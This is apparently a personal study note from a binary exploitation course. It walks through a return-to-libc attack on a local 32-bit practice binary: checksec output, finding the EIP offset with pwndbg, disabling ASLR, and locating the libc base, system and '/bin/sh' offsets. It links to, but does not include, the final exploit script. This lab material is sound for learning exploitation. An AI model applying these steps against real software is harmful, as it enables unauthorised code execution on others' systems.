[[Binary Exploitation/06 return to libc/x86/Source Code|Source Code]]

### File Checks

1. File -> `./secureserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/06/32/secureserver'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Manual Work

Find the EIP offset using GDB

```python
cyclic 100
gdb-pwndbg ./secureserver
```

Result:

```python
*EAX  0xffffcea0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EBX  0x61616172 ('raaa')
*ECX  0xf7e1e9c4 (_IO_stdfile_0_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049230 (__libc_csu_init) ◂— push ebp
*EBP  0x61616173 ('saaa')
*ESP  0xffffcef0 ◂— 'uaaavaaawaaaxaaayaaa'
*EIP  0x61616174 ('taaa')
```

Offset: `76`

Now to find the address of the libc binary for locally only we can use the following to turn of aslr which changes the assigned address for the libc binary

```python
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Now we can do:

```python
ldd ./secureserver
```

^5a9d22

Result:
```python
linux-gate.so.1 (0xf7fc7000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
/lib/ld-linux.so.2 (0xf7fc9000)
```

Now we know the base address of the libc binary

We now need to find the offsets of the functions inside of libc
So we need the system which we can find using

```python
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

^a65e5c

Result:

```python
3172: 0004c800    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

Now we need the string /bin/sh from the libc

```python
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
```

^52a3ac

Result:

```python
1b5faa /bin/sh
```

Now we can assemble the python script

[[Binary Exploitation/06 return to libc/x86/Python Script|Python Script]]